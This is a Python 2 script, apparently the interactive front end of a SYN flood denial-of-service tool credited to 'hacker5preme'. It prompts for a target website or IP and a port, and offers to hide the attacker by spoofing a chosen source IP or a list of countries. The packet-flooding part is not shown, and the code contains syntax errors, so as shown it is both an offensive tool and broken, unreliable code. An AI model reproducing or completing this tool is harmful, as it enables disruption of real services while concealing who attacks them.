#!/usr/bin/env python



def supcountries():
   supfile = 'supcountries.txt'
   supcountries = []   
   with open(supfile) as fp:
        for number,line in enumerate(fp):
            line = line.replace('\n', '')
            supcountries.append(line)
   if '' in supcountries:
      supcountries.remove('')   
   return supcountries


def definetarget():
  print 'Welcome to syn flood attack coded by hacker5preme'
  print ''  
  print 'If you want to attack a Website press Y, if not press N'
  target_choice = raw_input()

  if target_choice = 'N':
     print 'Please enter the target IP'
     destination = raw_input()
     print ''
  if target_choice = 'Y':
     print 'Please the target website in this format: http(s)://url.ending'
     destination = raw_input()
     print()

  return destination

def defineporttarget():
    print 'Enter the portnumber on which you want to attack your target: '
    targetport = int(raw_input())
    print ''
    return targetport

def anonymizing_input(supcountries):
    import socket    
    print 'Do you want to anonymize your attack, enter Y or N'
    awnser_yn = raw_input()
    if(awnser_yn == 'N'):
      print ''     
      print 'No anonymization for your attack'
      hostname = socket.gethostname()
      yourIP = socket.gethostbyname(hostname)
      print 'Your unanonymized IP is: ' + yourIP
      return yourIP
   
    else:
      print ''      
      print 'Anonymization selected'
      print 'There are 2 anonymizing possibilies'
      print ''
      print '1: Input your one IP-adress you want to spoof to' 
      print '2: Choose one or multiple Countries to anoymize through'
      print ''
      awnserchoice = raw_input('Input the number of your choice: ')
      
      if(awnserchoice == '1'):
         print ''
         print 'Your Choice: 1'
         print 'Input your IP-adress you want to spoof to'
         sourceip = raw_input()
         return sourceip
     
       
      if(awnserchoice == '2'):
         print ''
         print 'Your Choice: 2'
         print 'All countrys with beginning with A supported '
         question = raw_input('Do you want a list of them? Y | N ')
         if question == 'Y':
            for element in supcountries:
                print element
            print ''
         else:
              pass
         amountcountrys = raw_input('Please input the amount of countries you want to select ')
         amountcountrys = int(amountcountrys)
         counter = 0
         countryawnser = []
         while counter < amountcountrys:
               counter = counter + 1
               userc = raw_input(str(counter) + '. Country: ')
               if userc in supcountries:
                  countryawnser.append(userc)
               else:
                  print 'Not supported, start the script again'
         return countryawnser




